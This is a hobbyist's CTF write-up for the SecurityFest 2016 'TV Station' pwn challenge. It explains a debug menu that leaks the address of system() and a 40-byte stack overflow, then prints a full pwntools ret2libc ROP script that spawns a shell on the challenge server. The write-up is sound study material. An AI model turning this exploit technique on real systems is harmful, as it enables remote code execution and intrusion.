
Hi , this a task from securityfest2016 "TV Station - Pwn (100)"

so here i will talk about my write up in securityfest2016 
i just play for fun so i solved some tasks (web,rev,pwn) and then stop playing because it was boring to play alone 
and change from categorie to another 

so lets start

this task give us a simple menu : 

```
=== TV Station - Control Panel ===
   1) Show uptime
   2) Show current user
   3) Exit
   
```

so the first show us the time 
```
 16:30:32 up 10 days, 14:31,  1 user,  load average: 1.00, 0.99, 0.88
```

and the second run system('id')
but when we reverse the code we get that when we send 4 we get 

```
=== TV Station - Debug Menu ===
[Debug menu] system is @0x7fa4619045f0
[Debug menu] Enter cmd:

```

and here where we start :D

we get the address of system and in the cmd we have buffer overflow but :/ aslr / Nx  : on

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

so what we need is to run system('/bin/sh')

The buffer is expecting 40 bytes. Anything over that will start to write outside 

We need now : 

1. Lib add (nm -D libc-2.19.so | grep __libc_system).
2. Get pop rdi.
3. Cal @add system.
4. Cal @add "/bin/sh"


and our payload will be : "A*40+add_pop_rdi+add_binsh+add_sys"

after some calcule :

we write the code 

```
#!/usr/bin/python
from pwn import *

s = remote("pwn2.securityfest.ctf.rocks", 3000)
b = ""

print s.recvuntil(": ")
s.sendline("4")
s.recvuntil("@0x")

# get system add from the result
system = s.recv(12)
b = int(system,16) - 0x465f0 #0x465f0 from lib

s.recvuntil("cmd:")

#calcule the add of "/bin/sh" and "pop rdi"
binsh = b + 0x17ca63
poprdi = b + 0x22b9a

#generate the payload for 64 bit
payload = ""
payload += "A"*40
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(int(system,16))

s.sendline(payload)

s.interactive()

```


and pwned :D 

![Screenshot](pwn.PNG)
